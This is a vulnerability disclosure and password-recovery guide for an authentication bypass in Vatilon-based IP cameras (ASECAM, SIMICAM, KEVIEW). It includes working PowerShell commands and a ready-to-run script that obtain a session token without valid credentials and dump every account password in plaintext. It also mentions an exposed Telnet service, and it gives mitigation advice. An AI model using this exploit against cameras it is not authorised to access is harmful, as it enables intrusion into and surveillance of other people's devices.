# CVE-2025-63667 - Vatilon IP Camera Improper Authentication (Password Recovery)

> **Affected brands:** ASECAM, SIMICAM, KEVIEW (and other Vatilon OEM white-label cameras)  
> **Affected models:** H44, H43 (and likely other models with Vatilon firmware)  
> **Firmware versions confirmed:** V1.16.41-20250725, V1.14.92-20241120, V1.14.10-20240725  
> **CVSS v3.1:** 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)  
> **Status:** Unpatched as of March 2026 - vendor notified

---

## What is this?

If you own an **ASECAM H44**, **SIMICAM H44**, **KEVIEW H43**, or similar Vatilon-based IP camera and you have **forgotten your password** or the camera keeps saying your credentials are wrong, this guide explains how to recover access to your own device.

This document also serves as a public disclosure of a security vulnerability affecting these cameras.

---

## The Vulnerability

The web interface (`thttpd`) on these cameras exposes a CGI endpoint at:

```
/cgi-bin/web.cgi?mod=session&cmd=login1
```

This endpoint **issues a valid Session-Id token without verifying that the supplied credentials are correct**. The token can then be used to call other API endpoints — including one that returns all user accounts with **passwords stored and returned in plaintext**.

### Additional attack surface

- **Port 2360** exposes a Telnet shell (`IPCam login:`) intended for factory/maintenance use, never disabled in production firmware.
- The firmware runs **BusyBox Linux**, confirmed on kernel 5.10 (H44) and 4.9 (H43).
- CPU: `hi3516cv608` (H44), `fh8852v201` (H43).

---

## How to Recover Your Own Camera Password

> **Only do this on devices you own.** Accessing devices you do not own is illegal in most countries.

### Requirements

- Windows PC on the same local network as the camera
- `curl` (included in Windows 10/11) or PowerShell

### Step 1 - Find your camera's IP address

Use your router's admin panel, or tools like **Advanced IP Scanner** or **Fing** (mobile app) to find the camera IP (e.g. `192.168.1.100`).

You can also use **IPCBatchTool** (Vatilon's official utility) - it will discover the camera automatically via UDP broadcast.



### Step 2 - Obtain a session token (PowerShell)

Open **PowerShell** and run the following, replacing `192.168.x.x` with your camera's IP:

```powershell
$r = Invoke-WebRequest "http://192.168.x.x/cgi-bin/web.cgi?mod=session&cmd=login1" `
     -Headers @{"Authorization"="Basic YWRtaW46YWRtaW4="}
$sid = $r.Headers["Session-Id"]
Write-Host "Session token: $sid"
```

> `YWRtaW46YWRtaW4=` is the Base64 encoding of `admin:admin` - the credentials do not need to be correct for the token to be issued.

### Step 3 — Retrieve accounts and passwords

Run immediately after Step 2 (tokens expire quickly):

```powershell
$accounts = Invoke-WebRequest "http://192.168.x.x/cgi-bin/web.cgi?mod=account&cmd=list" `
            -Headers @{"Session-Id"=$sid}
$accounts.Content
```

The response will be a JSON array like:

```json
[{"name":"admin","pwd":"YourPasswordHere","type":0,"power":0}]
```

The `pwd` field contains your password **in plaintext**.

### Step 4 - Log in normally

Go to `http://192.168.x.x` in your browser and log in with the recovered credentials.

---

## One-liner script (save as `recover_camera.ps1`)

```powershell
param(
    [Parameter(Mandatory=$true)]
    [string]$CameraIP
)

Write-Host "[*] Connecting to camera at $CameraIP..."

try {
    $loginUrl = "http://$CameraIP/cgi-bin/web.cgi?mod=session&cmd=login1"
    $r = Invoke-WebRequest $loginUrl -Headers @{"Authorization"="Basic YWRtaW46YWRtaW4="} -ErrorAction Stop
    $sid = $r.Headers["Session-Id"]

    if (-not $sid) {
        Write-Host "[-] No Session-Id received. Camera may not be vulnerable or IP is wrong."
        exit 1
    }

    Write-Host "[+] Session token obtained: $sid"

    $accountUrl = "http://$CameraIP/cgi-bin/web.cgi?mod=account&cmd=list"
    $accounts = Invoke-WebRequest $accountUrl -Headers @{"Session-Id"=$sid} -ErrorAction Stop

    Write-Host "[+] Accounts found:"
    $accounts.Content | ConvertFrom-Json | ForEach-Object {
        Write-Host "    Username: $($_.name)  |  Password: $($_.pwd)"
    }
} catch {
    Write-Host "[-] Error: $_"
}
```

**Usage:**
```powershell
.\recover_camera.ps1 -CameraIP 192.168.x.x
```

---

## Identifying a vulnerable device

Your device is likely affected if:

- It is branded **ASECAM**, **SIMICAM**, or **KEVIEW**
- The model is **H44** or **H43**
- The web interface runs on port **80** and there is a service on port **2360**
- The firmware string contains `Vatilon` or the web UI contacts `*.vatilon.com`
- The board silkscreen reads `H44-11641E-D` or similar

---

## Mitigation

Until Vatilon releases a patch:

1. **Do not expose these cameras directly to the internet** (no port forwarding on ports 80 or 2360).
2. Place cameras on an **isolated VLAN** with no WAN access.
3. Use a **VPN** to access your camera remotely instead of port forwarding.
4. Monitor your router for unexpected outbound connections to `*.vatilon.com`.

---

## Disclosure Timeline

| Date | Event |
|------|-------|
| November 2025 | Vulnerability discovered and confirmed on ASECAM H44 |
| March 2026 | Public disclosure (vendor contact attempted) |
| — | Vendor patch: **not yet released** |

---

## References

- CVE ID: **CVE-2025-63667**
- Vatilon official site: [vatilon.com](https://vatilon.com)
- IPCBatchTool: available from Vatilon support page [download](https://www.vatilon.com/xflrjxz)
- Related brands: ASECAM ([asecam.com](https://asecam.com)), SIMICAM, KEVIEW

---

## Disclaimer

This document is published for **educational purposes and to help owners of affected devices recover access to their own property**. I do not condone unauthorized access to any device. Always ensure you have explicit permission before testing any device you do not own.
